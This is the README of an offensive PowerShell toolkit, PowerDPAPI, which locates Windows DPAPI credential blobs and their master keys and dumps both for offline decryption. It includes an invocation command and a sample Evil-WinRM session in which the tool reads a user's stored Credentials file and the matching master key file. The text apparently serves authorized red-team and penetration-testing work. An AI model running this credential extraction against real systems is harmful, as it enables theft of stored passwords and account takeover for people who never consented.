# PowerDPAPI
Offensive toolkit for DPAPI written in PowerShell  
Check out my post on medium for a detailed breakdown [Fileless DPAPI Credential Extraction With PowerShell](https://medium.com/p/c9952c136463)

> [!CAUTION]
> Disclaimer: Intended only for use on systems that you are legally authorized to access.
## Functionality
This is currently in PoC and demonstrates the ability to:
- Locate blobs by searching from a given point and checking file signatures
- Read the master key GUID from the blob file
- Read the description from the blob file
- Find the associated master key
- Dump the blob and master key bytes for decryption
- ## Usage
1. Download and load
2. Run Invoke-PowerDPAPI with options
```
Invoke-PowerDPAPI -Path <file/directory path> -Format base64 -Verbose
```
```
*Evil-WinRM* PS C:\Users\sample.user\Documents> Invoke-PowerDPAPI -Path "C:\users\sample.user\appdata\roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9"
[*] Running PowerDPAPI
**********************************************************************
[!] Probable DPAPI blob found
[>] File: C:\users\sample.user\appdata\roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
[>] MD5 Hash: DD0259EC230BB91EF986E7B97835B0E4
[>] SHA-1 Hash: 8AFFB716BB354D804B35A6DD67A76A282AC14A9C
[>] SHA-256 Hash: 8548009D5C745646B375904CB5531E28622A595652F255A1DF2E5EB50DF3D654
[>] Master Key GUID: 556a2412-1275-4ccf-b721-e6a0b4f90407
[>] Blob Description: Enterprise Credential Data

-------------- START blob output --------------
\x01\x00\x00\x00\x92\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\xD0\x8C\x9D\...redacted
--------------  EOF blob output  --------------
[>] Locating corresponding master key file
[>] Master Key Found:
    C:\Users\sample.user\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
-------------- START master key --------------
\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x35\x00\x35\x00\x36\x00\x61\...redacted
--------------  EOF master key  --------------
**********************************************************************
[*] Done.
*Evil-WinRM* PS C:\Users\sample.user\Documents>
```
